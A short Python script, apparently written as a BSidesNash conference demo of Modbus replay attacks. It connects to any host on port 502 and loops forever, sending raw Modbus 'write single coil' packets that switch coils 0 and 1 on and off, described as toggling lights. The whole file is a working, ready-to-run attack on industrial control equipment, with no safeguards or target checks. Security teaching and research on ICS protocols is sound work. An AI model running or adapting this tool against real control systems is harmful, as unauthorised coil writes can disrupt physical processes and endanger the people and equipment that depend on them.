#!/usr/bin/env python
# Author: Stephen J. Hilt
#	Written for BsidesNash with Chris Sistrunk to demo
#	How Replay of Modbus packets work. 
#
#
#########################################################

import argparse
import socket
import sys
import time 


# Argument Checking
if (len(sys.argv) != 2): 
	print("USAGE: python ./modturnt.py <host>")
	sys.exit()

# host is passed in via cli arguments
host=sys.argv[1]
# modbus port
port=502

# make the socket and the connection to the host and port specified 
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
except socket.error:
	print("\n||\n|| Connection unsuccessfull...\n||\n")
	sys.exit()
# Set Coil 0/1 to 1 (Turn on lights)
turnt_1 = "\x00\x02\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00" 
turnt_2 = "\x00\x02\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00"
# Sec Coil 0/1 to 0 (Turn off lights)
turndown_1 = "\x00\x02\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00"
turndown_2 = "\x00\x02\x00\x00\x00\x06\x01\x05\x00\x00\x00\x00"
# infinite loop to toggle lights 
while True:
	# send the packets
	sock.send(str(turnt_1))
	sock.recv(4096)
	time.sleep(1)
	sock.send(str(turnt_2))
	sock.recv(4096)
	time.sleep(1)
	sock.send(str(turndown_1))
	sock.recv(4096)
	time.sleep(1)
	sock.send(str(turndown_2))
	sock.recv(4096)
	time.sleep(1)

# close the socket.
sock.close()
sys.exit()
